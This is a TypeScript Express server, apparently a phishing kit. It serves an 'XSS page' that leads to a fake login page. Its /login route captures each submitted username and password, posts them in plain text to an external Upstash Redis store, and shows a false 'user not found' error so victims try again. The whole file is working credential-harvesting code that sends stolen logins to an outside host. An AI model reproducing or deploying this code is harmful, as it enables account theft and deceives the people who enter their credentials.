import express, { Request, Response } from 'express';
import path from 'path';
import fs from 'fs';
import { exec } from 'child_process';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const PORT: number = 3000;

// Middleware to parse form data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files (CSS, images, etc.)
app.use(express.static('public'));
app.use('/assets', express.static('src/assets'));

const tentativas: number = 5;

const openBrowser = (url: string): void => {
    const start = process.platform === 'darwin' ? 'open' :
        process.platform === 'win32' ? 'start' : 'xdg-open';
    exec(`${start} ${url}`);
};

interface LoginData {
    usuario: string;
    senha: string;
    timestamp?: string;
}
const saveCredentialsToUpstash = async (usuario: string, senha: string): Promise<void> => {
    const loginData = {
        usuario: usuario,
        senha: senha,
        timestamp: new Date().toISOString()
    };

    try {
        // Save to Upstash Redis using REST API
        const response = await fetch(`${process.env.UPSTASH_REDIS_REST_URL}/hset/user:${usuario}/usuario/${usuario}/senha/${senha}/timestamp/${loginData.timestamp}`, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${process.env.UPSTASH_REDIS_REST_TOKEN}`
            }
        });

        if (response.ok) {
            console.log(`💾 Credentials saved to Upstash Redis for user: ${usuario}`);
        } else {
            console.error('Failed to save credentials to Upstash Redis');
        }
    } catch (error) {
        console.error('Error saving credentials to Upstash:', error);
    }
};

// Route for the XSS page (initial page)
app.get('/', (req: Request, res: Response): void => {
    try {
        const htmlTemplate = fs.readFileSync(path.join(__dirname, 'xss_page.html'), 'utf8');
        let htmlWithData = htmlTemplate.replace('{{tentativas}}', tentativas.toString());
        htmlWithData = htmlWithData.replace('{{error_message}}', '');

        res.send(htmlWithData);
    } catch (error) {
        console.error('Error reading XSS HTML template:', error);
        res.status(500).send('Internal Server Error');
    }
});

// Route for the fake page (redirected from XSS page)
app.get('/fake_page.html', (req: Request, res: Response): void => {
    try {
        const htmlTemplate = fs.readFileSync(path.join(__dirname, 'fake_page.html'), 'utf8');
        let htmlWithData = htmlTemplate.replace('{{tentativas}}', tentativas.toString());

        // Show error message if there's an error parameter
        const showError = req.query.error === 'invalid';
        if (showError) {
            htmlWithData = htmlWithData.replace('{{error_message}}', '<div style="color: red; font-size: 14px; margin-top: 10px;">• Usuário não encontrado</div>');
        } else {
            htmlWithData = htmlWithData.replace('{{error_message}}', '');
        }

        res.send(htmlWithData);
    } catch (error) {
        console.error('Error reading fake page HTML template:', error);
        res.status(500).send('Internal Server Error');
    }
});

app.post('/login', async (req: Request, res: Response): Promise<void> => {
    const { usuario, senha } = req.body;

    // Save to Upstash Redis
    await saveCredentialsToUpstash(usuario, senha);

    // Log the attempt and redirect back with error
    console.log(`Login attempt saved: ${usuario}`);
    res.redirect('/fake_page.html?error=invalid');
});

app.listen(PORT, (): void => {
    const url = `http://localhost:${PORT}`;
    console.log(`Servidor rodando em ${url}`);
    console.log('Iniciando com XSS page, que redirecionará para fake page e depois para link externo...');
    
});